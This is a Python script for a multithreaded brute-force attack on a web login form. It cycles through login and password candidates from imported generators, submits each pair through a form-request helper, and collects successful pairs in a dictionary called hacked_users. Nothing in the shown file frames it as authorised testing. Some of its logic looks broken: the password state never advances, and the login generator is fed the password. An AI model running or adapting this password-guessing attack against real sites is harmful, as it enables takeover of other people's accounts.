import time
from threading import Thread

import requests

from generators.from_users_file import get_next_str as get_next_login
from brute_force import get_next_str as get_next_password
from requesters.forms_query import request

hacked_users = {}
attempts = 3

password_state = 'password'

def hack(end_time):
    global password_state

    step = 0
    password = ''
    while password is not None:
        login = ''
        while login is not None:
            for _ in range(attempts):
                if time.time() >= end_time:
                    return

                try:
                    if request(login, password):
                        print('Success', login, password)
                        hacked_users[login] = password
                    break
                except:
                    print('Error: ', login, password)
            login = get_next_login(password)

            step += 1
            if step % 100 == 0:
                print(step, login, password)

        password = get_next_password(password_state)

def hack_threaded(threads, seconds):
    end = time.time() + seconds
    run_threads = []
    for t_id in range(threads):
        t = Thread(target=hack, args=(end,))
        t.start()
        run_threads.append(t)
        print('thread', t_id, 'run')
    for t in run_threads:
        t.join(timeout=seconds)
        print(t, 'stopped')


if __name__ == '__main__':
    hack_threaded(threads=2, seconds=10)
    print('Result')
    print(hacked_users)
